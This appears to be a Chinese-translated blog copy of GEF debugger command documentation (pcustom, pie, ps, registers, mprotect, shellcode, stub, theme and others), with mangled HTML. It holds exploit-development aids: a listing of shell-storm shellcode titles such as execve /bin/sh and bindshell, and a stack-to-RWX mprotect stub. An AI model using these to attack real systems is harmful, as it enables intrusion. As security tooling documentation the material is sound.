&apos;/tmp/gef/structs/mystruct_t.py&apos; from template<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">代码可以像任何Python（使用`ctypes`）代码一样定义。</span><br></pre></td></tr></table></figure>from ctypes import *</code></pre></li></ul><p>‘’’<br>typedef struct {<br>  int age;<br>  char name[256];<br>  int id;<br>} person_t;<br>‘’’</p><p>class person_t(Structure):<br>    <em>fields</em> = [<br>        (“age”,  c_int),<br>        (“name”, c_char * 256),<br>        (“id”, c_int),<br>    ]</p><pre><code>_values_ = [    # You can define a function to substitute the value    (&quot;age&quot;, lambda age: &quot;Old&quot; if age &gt; 40 else &quot;Young&quot;),    # Or alternatively a list of 2-tuples    (&quot;id&quot;, [        (0, &quot;root&quot;),        (1, &quot;normal user&quot;),        (None, &quot;Invalid person&quot;)    ])]</code></pre><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">`pcustom`至少需要一个参数，即结构体的名称。 只有一个参数时，`pcustom`将转储此结构体的所有字段。</span><br></pre></td></tr></table></figure><p>gef➤  dt person_t<br>+0000 age c_int (x4)  →  Young<br>+0004 name c_char_Array_256 (x100)<br>+0104 id c_int (x1)   →  normal user</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">通过提供地址或GDB符号，<span class="code">`gef`</span>将把这个用户定义的结构体应用于指定的地址：</span><br><span class="line"></span><br><span class="line">![<span class="string">mark</span>](<span class="link">../../../../../../program/writing/images/gef/uJEK5zGvDOCf.png</span>)</span><br><span class="line"></span><br><span class="line">这意味着我们现在可以非常轻松地创建新的用户定义结构体</span><br><span class="line"></span><br><span class="line">观看Asciinema的演示视频：</span><br><span class="line"></span><br><span class="line">[<span class="string">![asciicast</span>](<span class="link">../../../../../../program/writing/images/gef/bhsguibtf4iqyyuomp3vy8iv2.png</span>)](<span class="link">https://asciinema.org/a/bhsguibtf4iqyyuomp3vy8iv2</span>)</span><br><span class="line"></span><br><span class="line">此外，如果您已成功配置IDA设置（请参阅命令<span class="code">`ida-interact`</span>），您还可以直接在GDB会话中直接导入在IDA中进行逆向工程的结构体：</span><br><span class="line"></span><br><span class="line">![<span class="string">mark</span>](<span class="link">../../../../../../program/writing/images/gef/ijlTYArWpr68.png</span>)</span><br><span class="line"></span><br><span class="line">然后使用命令<span class="code">`ida ImportStructs`</span>导入所有结构体，或者<span class="code">`ida ImportStruct `</span>只导入一个特定的结构体：</span><br></pre></td></tr></table></figure><p>gef➤  ida ImportStructs<br>[+] Success</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![<span class="string">mark</span>](<span class="link">../../../../../../program/writing/images/gef/tayxIKotL8eF.png</span>)</span><br><span class="line"></span><br><span class="line"><span class="section">## pie 命令</span></span><br><span class="line"></span><br><span class="line"><span class="code">`pie`</span>命令提供了一种为启用PIE的二进制文件设置断点的有用方法。 <span class="code">`pie`</span>命令提供我们称之为“PIE断点”的东西。 PIE断点只是一个虚拟断点，当进程附加时，它将被设置为实际断点。 PIE断点的地址是二进制基址的偏移量。</span><br><span class="line"></span><br><span class="line">请注意，您需要使用整个PIE命令序列来支持PIE断点，尤其是<span class="code">`pie`</span>命令提供的“附加”命令，如<span class="code">`pie attach`</span>，<span class="code">`pie run`</span>等。</span><br><span class="line"></span><br><span class="line">用法：</span><br></pre></td></tr></table></figure><p>gef➤ pie <sub_commands></p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### `pie breakpoint` 命令</span><br><span class="line"></span><br><span class="line">此命令设置新的PIE断点。 它可以像gdb中的普通`breakpoint`命令一样使用。 该位置只是与基址的偏移量。 此命令后不会立即设置断点。 相反，它将在您使用`pie attach`，`pie run`，`pie remote`实际附加到进程时设置，因此它可以解析正确的基址。</span><br><span class="line"></span><br><span class="line">用法：</span><br></pre></td></tr></table></figure><p>gef➤ pie breakpoint <LOCATION></p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### `pie info` 命令</span><br><span class="line"></span><br><span class="line">由于PIE断点不是真正的断点，因此该命令提供了一种观察所有PIE断点状态的方法。</span><br><span class="line"></span><br><span class="line">这就像gdb中的`info breakpoint`。</span><br></pre></td></tr></table></figure><p>gef➤  pie info<br>VNum    Num Addr<br>1   N/A 0xdeadbeef</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">VNum是虚拟号码，它是PIE断点的编号。 Num是gdb中相应实际断点数的编号。 地址是PIE断点的地址。</span><br><span class="line"></span><br><span class="line">您可以忽略VNum参数以获取所有PIE断点的信息。</span><br><span class="line"></span><br><span class="line">用法：</span><br></pre></td></tr></table></figure><p>gef➤  pie info [VNum]</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### `pie delete` 命令</span><br><span class="line"></span><br><span class="line">给定该PIE断点的VNum时，此命令将删除PIE断点。</span><br><span class="line"></span><br><span class="line">用法：</span><br></pre></td></tr></table></figure><p>gef➤  pie delete <VNum></p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### `pie attach` 命令</span><br><span class="line"></span><br><span class="line">与gdb的`attach`命令相同。 如果您有PIE断点，请始终使用此命令而不是原始`attach`。 这将在附加时设置真正的断点。</span><br><span class="line"></span><br><span class="line">用法与`attach`相同。</span><br><span class="line"></span><br><span class="line">### `pie remote` 命令</span><br><span class="line"></span><br><span class="line">与gdb的`remote`命令相同。 如果您有PIE断点，请始终使用此命令而不是原始`remote`。 这将在附加时设置真正的断点。</span><br><span class="line"></span><br><span class="line">用法与`remote`相同。</span><br><span class="line"></span><br><span class="line">### `pie run` 命令</span><br><span class="line"></span><br><span class="line">与gdb的`run`命令相同。 如果您有PIE断点，请始终使用命令而不是原始`run`。 这将在附加时设置真正的断点。</span><br><span class="line"></span><br><span class="line">用法与`run`相同。</span><br><span class="line"></span><br><span class="line">## print-format 命令</span><br><span class="line"></span><br><span class="line">- 命令</span><br></pre></td></tr></table></figure><pre><code>print-format<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">（别名</span><br></pre></td></tr></table></figure>pf<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">）将根据指定的编程语言的语法将任意位置转储为字节数组。 目前，支持的输出语言是</span><br><span class="line"></span><br><span class="line">- Python (`py` – 默认)</span><br><span class="line">- C (`c`)</span><br><span class="line">- Assembly (`asm`)</span><br><span class="line">- Javascript (`js`)</span><br></pre></td></tr></table></figure></code></pre><p>gef➤  print-format -h<br>[+] print-format [-f FORMAT] [-b BITSIZE] [-l LENGTH] [-c] [-h] LOCATION<br>        -f FORMAT specifies the output format for programming language, avaliable value is py, c, js, asm (default py).<br>        -b BITSIZE sepecifies size of bit, avaliable values is 8, 16, 32, 64 (default is 8).<br>        -l LENGTH specifies length of array (default is 256).<br>        -c The result of data will copied to clipboard (requires xclip)<br>        LOCATION specifies where the address of bytes is stored.</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">例如，此命令将从`$rsp`转储<span class="number">10</span>个字节，并将结果复制到剪贴板。</span><br></pre></td></tr></table></figure><p>gef➤  print-format -f py -b 8 -l 10 -c $rsp<br>[+] Copied to clipboard<br>buf = [0x87, 0xfa, 0xa3, 0xf7, 0xff, 0x7f, 0x0, 0x0, 0x30, 0xe6]</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">## process-search 命令</span><br><span class="line"></span><br><span class="line">`process-search`（又名`ps`）是一个方便的命令，用于在主机上列出和过滤进程。 它的目的是在针对分叉过程（例如在新连接上分叉的tcp/listen守护进程）时使调试过程更容易一些。</span><br><span class="line"></span><br><span class="line">如果没有参数，它将返回用户可以访问的所有进程：</span><br></pre></td></tr></table></figure><p>gef➤  ps<br>1               root            0.0             0.4             ?           /sbin/init<br>2               root            0.0             0.0             ?           [kthreadd]<br>3               root            0.0             0.0             ?           [ksoftirqd/0]<br>4               root            0.0             0.0             ?           [kworker/0:0]<br>5               root            0.0             0.0             ?           [kworker/0:0H]<br>6               root            0.0             0.0             ?           [kworker/u2:0]<br>7               root            0.0             0.0             ?           [rcu_sched]<br>8               root            0.0             0.0             ?           [rcuos/0]<br>9               root            0.0             0.0             ?           [rcu_bh]<br>10              root            0.0             0.0             ?           [rcuob/0]<br>11              root            0.0             0.0             ?           [migration/0]<br>[…]</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">或者启用过滤器：</span><br></pre></td></tr></table></figure><p>gef➤  ps bash<br>22590           vagrant         0.0             0.8             pts/0       -bash</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">`ps`也允许使用以下选项：</span><br><span class="line"></span><br><span class="line">- `-s`（`smart`）将丢弃一些进程（属于不同的用户，用作参数的模式而不是命令等）</span><br><span class="line">- `-a`（`attach`）将自动附加到找到的第一个进程</span><br><span class="line"></span><br><span class="line">因此，例如，如果您的目标进程名为`/home/foobar/plop`，但现有实例通过`socat`使用，如</span><br></pre></td></tr></table></figure><p>$ socat tcp-l:1234,fork,reuseaddr exec:/home/foobar/plop</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">每次向tcp/<span class="number">1234</span>打开一个新连接时，`plop`将被分叉，并且`gef`可以通过命令轻松附加到它</span><br></pre></td></tr></table></figure><p>gef➤  ps -as plop</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">## process-status 命令</span><br><span class="line"></span><br><span class="line">&gt; 此命令用于替换旧命令`pid`和`fd`。</span><br><span class="line"></span><br><span class="line">`process-status`提供了对当前运行进程的详尽描述，通过扩展GDB`info proc`命令提供的信息，以及来自`procfs`结构的所有信息。</span><br></pre></td></tr></table></figure><p>gef➤ ps -s zsh<br>22879<br>gef➤ attach 22879<br>[…]<br>gef➤ status<br>[+] Process Information<br>        PID  →  22879<br>        Executable  →  /bin/zsh<br>        Command line  →  ‘-zsh’<br>[+] Parent Process Information<br>        Parent PID  →  4475<br>        Command line  →  ‘tmux new -s cool vibe<br>[+] Children Process Information<br>        PID  →  26190 (Name: ‘/bin/sleep’, CmdLine: ‘sleep 100000’)<br>[+] File Descriptors:<br>        /proc/22879/fd/0  →  /dev/pts/4<br>        /proc/22879/fd/1  →  /dev/pts/4<br>        /proc/22879/fd/2  →  /dev/pts/4<br>        /proc/22879/fd/10  →  /dev/pts/4<br>[+] File Descriptors:<br>        No TCP connections</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">## registers 命令</span><br><span class="line"></span><br><span class="line">`registers`命令将打印所有寄存器并取消引用任何指针。 它没有任何参数。</span><br><span class="line"></span><br><span class="line">MIPS主机上的示例：</span><br></pre></td></tr></table></figure><p>gef&gt; reg<br>$zero     : 0x00000000<br>$at       : 0x00000001<br>$v0       : 0x7fff6cd8 -&gt; 0x77e5e7f8 -&gt; &lt;<strong>libc_start_main+200&gt;: bnez v0,0x77e5e8a8<br>$v1       : 0x77ff4490<br>$a0       : 0x00000001<br>$a1       : 0x7fff6d94 -&gt; 0x7fff6e85 -&gt; “/root/demo-mips”<br>$a2       : 0x7fff6d9c -&gt; 0x7fff6e91 -&gt; “SHELL=/bin/bash”<br>$a3       : 0x00000000<br>$t0       : 0x77fc26a0 -&gt; 0x0<br>$t1       : 0x77fc26a0 -&gt; 0x0<br>$t2       : 0x77fe5000 -&gt; “_dl_fini”<br>$t3       : 0x77fe5000 -&gt; “_dl_fini”<br>$t4       : 0xf0000000<br>$t5       : 0x00000070<br>$t6       : 0x00000020<br>$t7       : 0x7fff6bc8 -&gt; 0x0<br>$s0       : 0x00000000<br>$s1       : 0x00000000<br>$s2       : 0x00000000<br>$s3       : 0x00500000<br>$s4       : 0x00522f48<br>$s5       : 0x00522608<br>$s6       : 0x00000000<br>$s7       : 0x00000000<br>$t8       : 0x0000000b<br>$t9       : 0x004008b0 -&gt; <main>: addiu sp,sp,-32<br>$k0       : 0x00000000<br>$k1       : 0x00000000<br>$s8       : 0x00000000<br>$status   : 0x0000a413<br>$badvaddr : 0x77e7a874 -&gt; &lt;</strong>cxa_atexit&gt;: lui gp,0x15<br>$cause    : 0x10800024<br>$pc       : 0x004008c4 -&gt; &lt;main+20&gt;: li v0,2<br>$sp       : 0x7fff6ca0 -&gt; 0x77e4a834 -&gt; 0x29bd<br>$hi       : 0x000001a5<br>$lo       : 0x00005e17<br>$fir      : 0x00739300<br>$fcsr     : 0x00000000<br>$ra       : 0x77e5e834 -&gt; &lt;__libc_start_main+260&gt;: lw gp,16(sp)<br>$gp       : 0x00418b20</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="section">## reset-cache 命令</span></span><br><span class="line"></span><br><span class="line">这是一个过时的函数，用于重置GEF内部memoize缓存，不需要再从命令行调用它。</span><br><span class="line"></span><br><span class="line">这个命令很快就会消失……</span><br><span class="line"></span><br><span class="line"><span class="section">## ropper 命令</span></span><br><span class="line"></span><br><span class="line"><span class="code">`ropper`</span>是一个gadget查找工具，可以通过<span class="code">`pip`</span>轻松安装。 它提供了一个非常方便的<span class="code">`--search`</span>函数来从正则表达式搜索gadget：</span><br><span class="line"></span><br><span class="line">![<span class="string">mark</span>](<span class="link">../../../../../../program/writing/images/gef/jGDxkfIgaAtH.png</span>)</span><br><span class="line"></span><br><span class="line"><span class="code">`ropper`</span>带有一整套选项，所有选项都记录在<span class="code">`--help`</span>菜单中。</span><br><span class="line"></span><br><span class="line"><span class="section">## scan 命令</span></span><br><span class="line"></span><br><span class="line"><span class="code">`scan`</span>搜索位于属于另一个程序的内存映射（haystack）中的地址。</span><br><span class="line"></span><br><span class="line">![<span class="string">mark</span>](<span class="link">../../../../../../program/writing/images/gef/JMnPmBGvDExU.png</span>)</span><br><span class="line"></span><br><span class="line"><span class="code">`scan`</span>需要两个参数，第一个是要搜索的内存部分，第二个是要搜索的内容。 参数是针对进程内存映射的（与[<span class="string">vmmap</span>](<span class="link">https://gef.readthedocs.io/en/master/commands/scan/docs/commands/vmmap.md</span>)一样，以确定要搜索的内存范围。</span><br><span class="line"></span><br><span class="line"><span class="section">## search-pattern 命令</span></span><br><span class="line"></span><br><span class="line"><span class="code">`gef`</span>允许您在在运行时搜索进程内存布局的所有段中的特定字符串。 <span class="code">`search-pattern`</span>命令，别名<span class="code">`grep`</span>，旨在直接使用：</span><br></pre></td></tr></table></figure><p>gef➤  search-pattern MyPattern</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![<span class="string">mark</span>](<span class="link">../../../../../../program/writing/images/gef/qjzUk3Li5iW0.png</span>)</span><br><span class="line"></span><br><span class="line">它将提供一个易于理解的特定字符串的发现，包括它/它们被发现的部分，以及与该部分相关的权限。</span><br><span class="line"></span><br><span class="line"><span class="code">`search-pattern`</span>也可用于搜索地址。 为此，只需确保您的字符串以“0x”开头并且是有效的十六进制地址。 例如：</span><br></pre></td></tr></table></figure><p>gef➤  search-pattern 0x4005f6</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![<span class="string">mark</span>](<span class="link">../../../../../../program/writing/images/gef/QbanlWbld2Oa.png</span>)</span><br><span class="line"></span><br><span class="line"><span class="code">`search-pattern`</span>命令也可以用作搜索地址交叉引用的方法。 因此，别名<span class="code">`xref`</span>也指向命令<span class="code">`search-pattern`</span>。 因此，上面的命令相当于<span class="code">`xref 0x4005f6`</span>，这使得它更直观。</span><br><span class="line"></span><br><span class="line"><span class="section">## set-permission 命令</span></span><br><span class="line"></span><br><span class="line">添加此命令是为了便于漏洞利用过程，方法是直接从调试器更改特定内存页上的权限。</span><br><span class="line"></span><br><span class="line">默认情况下，<span class="code">`GDB`</span>不允许您这样做，因此该命令将修改正在调试的二进制文件的代码部分，并添加本机mprotect系统调用存根。 例如，对于x86，将插入以下存根：</span><br></pre></td></tr></table></figure><p>pushad<br>mov eax, mprotect_syscall_num<br>mov ebx, address_of_the_page<br>mov ecx, size_of_the_page<br>mov edx, permission_to_set<br>int 0x80<br>popad</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">在此存根之后添加断点，该点在命中时将恢复原始上下文，允许您继续执行。</span><br></pre></td></tr></table></figure><p>mprotect<code>是</code>set-permission<code>的别名。 举个例子，在这个二进制文件中将</code>stack<code>设置为</code>READ|WRITE|EXECUTE</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![<span class="string">mark</span>](<span class="link">../../../../../../program/writing/images/gef/MY56Kvq0X69O.png</span>)</span><br><span class="line"></span><br><span class="line">运行</span><br></pre></td></tr></table></figure><p>gef➤ mprotect 0xfffdd000</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">就是这样! <span class="code">`gef`</span> 将使用内存运行时的信息来正确调整整个部分的保护。</span><br><span class="line"></span><br><span class="line">![<span class="string">mark</span>](<span class="link">../../../../../../program/writing/images/gef/a6nGnG0rKdNq.png</span>)</span><br><span class="line"></span><br><span class="line">或者在PowerPC VM上获得完整的演示视频： [<span class="string">![mark</span>](<span class="link">../../../../../../program/writing/images/gef/9vHvvswPk0MS.png</span>)](<span class="link">https://asciinema.org/a/54noulja01k3cgctawjeio8xl</span>)</span><br><span class="line"></span><br><span class="line"><span class="section">## shellcode 命令</span></span><br></pre></td></tr></table></figure><p>shellcode<code>是@JonathanSalwan shellcodes数据库的命令行客户端。 它可以用来直接通过</code>GEF<code>搜索和下载你正在寻找的shellcode。 有两个原始子命令，</code>search<code>和</code>get<br>gef➤ shellcode search arm<br>[+] Showing matching shellcodes<br>901     Linux/ARM       Add map in /etc/hosts file - 79 bytes<br>853     Linux/ARM       chmod(“/etc/passwd”, 0777) - 39 bytes<br>854     Linux/ARM       creat(“/root/pwned”, 0777) - 39 bytes<br>855     Linux/ARM       execve(“/bin/sh”, [], [0 vars]) - 35 bytes<br>729     Linux/ARM       Bind Connect UDP Port 68<br>730     Linux/ARM       Bindshell port 0x1337<br>[…]<br>gef➤ shellcode get 698<br>[+] Downloading shellcode id=698<br>[+] Shellcode written as ‘/tmp/sc-EfcWtM.txt’<br>gef➤ system cat /tmp/sc-EfcWtM.txt<br>/*<br>Title:     Linux/ARM - execve(“/bin/sh”, [0], [0 vars]) - 27 bytes<br>Date:      2010-09-05<br>Tested on: ARM926EJ-S rev 5 (v5l)<br>Author:    Jonathan Salwan - twitter: @jonathansalwan</p><p>shell-storm.org</p><p>Shellcode ARM without 0x20, 0x0a and 0x00<br>[…]</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">## stub 命令</span><br><span class="line"></span><br><span class="line">`stub`命令允许你存根函数，可选择指定返回值。</span><br></pre></td></tr></table></figure><p>gef➤  stub [-h] [-r RETVAL] [LOCATION]</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="code">`LOCATION`</span>表示要绕过的功能的地址。 如果未指定，gef将认为程序计数器处的指令是函数的开始。</span><br><span class="line"></span><br><span class="line">如果提供了<span class="code">`-r RETVAL`</span>，gef会将返回值设置为提供的值。 否则，它会将返回值设置为0。</span><br><span class="line"></span><br><span class="line">例如，绕过<span class="code">`fork()`</span>调用是微不足道的。 由于返回值设置为0，因此它实际上将我们放入“子”进程。 必须注意的是，这是一个与经典的“set follow-fork-mode child”不同的行为，因为在这里我们不会产生一个新的进程，我们只是欺骗父进程认为它已经成为了孩子。</span><br><span class="line"></span><br><span class="line"><span class="section">### 例子</span></span><br><span class="line"></span><br><span class="line">绕过 <span class="code">`fork()`</span> 调用:</span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>Without stub: ![<span class="string">mark</span>](<span class="link">../../../../../../program/writing/images/gef/8zMXiVW61qsn.png</span>)</span><br><span class="line"><span class="bullet">- </span>With stub: ![<span class="string">mark</span>](<span class="link">../../../../../../program/writing/images/gef/rI1ggEgckp5G.png</span>)</span><br><span class="line"></span><br><span class="line"><span class="section">## theme 命令</span></span><br><span class="line"></span><br><span class="line">通过改变颜色方案来定制<span class="code">`GEF`</span>。</span><br></pre></td></tr></table></figure><p>gef➤  theme<br>context_title_message                   : red bold<br>default_title_message                   : red bold<br>default_title_line                      : green bold<br>context_title_line                      : green bold<br>disable_color                           : 0<br>xinfo_title_message                     : blue bold</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="section">### 改变颜色</span></span><br><span class="line"></span><br><span class="line">您可以使用<span class="code">`theme`</span>命令更改<span class="code">`GEF`</span>显示的着色属性。 该命令接受2个参数，要更新的属性的名称及其新的着色值。</span><br><span class="line"></span><br><span class="line">颜色可以是以下之一：</span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>red</span><br><span class="line"><span class="bullet">- </span>green</span><br><span class="line"><span class="bullet">- </span>blue</span><br><span class="line"><span class="bullet">- </span>yellow</span><br><span class="line"><span class="bullet">- </span>gray</span><br><span class="line"><span class="bullet">- </span>pink</span><br><span class="line"></span><br><span class="line">Color还接受以下属性：</span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>bold</span><br><span class="line"><span class="bullet">- </span>underline</span><br><span class="line"><span class="bullet">- </span>highlight</span><br><span class="line"><span class="bullet">- </span>blink</span><br><span class="line"></span><br><span class="line">任何其他的值都会被忽略。</span><br></pre></td></tr></table></figure><p>gef➤  theme context_title_message blue bold foobar<br>gef➤  theme<br>context_title_message                   : blue bold<br>default_title_message                   : red bold<br>default_title_line                      : green bold<br>context_title_line                      : green bold<br>disable_color                           : 0<br>xinfo_title_message                     : blue bold</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="section">## tmux-setup 命令</span></span><br><span class="line"></span><br><span class="line">为了使调试会话更容易，同时更有效，<span class="code">`GEF`</span>整合了两个命令：</span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span><span class="code">`tmux-setup`</span></span><br><span class="line"><span class="bullet">- </span><span class="code">`screen-setup`</span></span><br><span class="line"></span><br><span class="line">这些命令将检查GDB是否从<span class="code">`tmux`</span>（个别情况下<span class="code">`screen`</span>）会话中生成，如果是，则将垂直拆分窗格，并将上下文配置为重定向到新窗格，如下所示：</span><br><span class="line"></span><br><span class="line">![<span class="string">mark</span>](<span class="link">../../../../../../program/writing/images/gef/hf8sgVMMJR4U.png</span>)</span><br><span class="line"></span><br><span class="line">要进行设置，只需输入即可</span><br></pre></td></tr></table></figure><p>gef➤ tmux-setup</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="strong">**注意**</span>：虽然<span class="code">`screen-setup`</span>提供了类似的设置，但是<span class="code">`screen`</span>的结构不允许非常干净的方式来执行此操作。 因此，如果可能，建议使用<span class="code">`tmux-setup`</span>命令。</span><br><span class="line"></span><br><span class="line"><span class="section">## trace-run 命令</span></span><br><span class="line"></span><br><span class="line"><span class="code">`trace-run`</span>命令旨在直接在IDA反汇编程序中提供特定执行所采用的路径。 它应该与IDA脚本[<span class="string">`ida_color_gdb_trace.py`</span>](<span class="link">https://github.com/hugsy/stuff/blob/master/ida_scripts/ida_color_gdb_trace.py</span>)一起使用</span><br><span class="line"></span><br><span class="line">它将跟踪并存储执行流程中<span class="code">`$pc`</span>所取的所有值，从当前值到作为参数提供的值。</span><br></pre></td></tr></table></figure><p>gef➤ trace-run <address_of_last_instruction_to_trace></p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 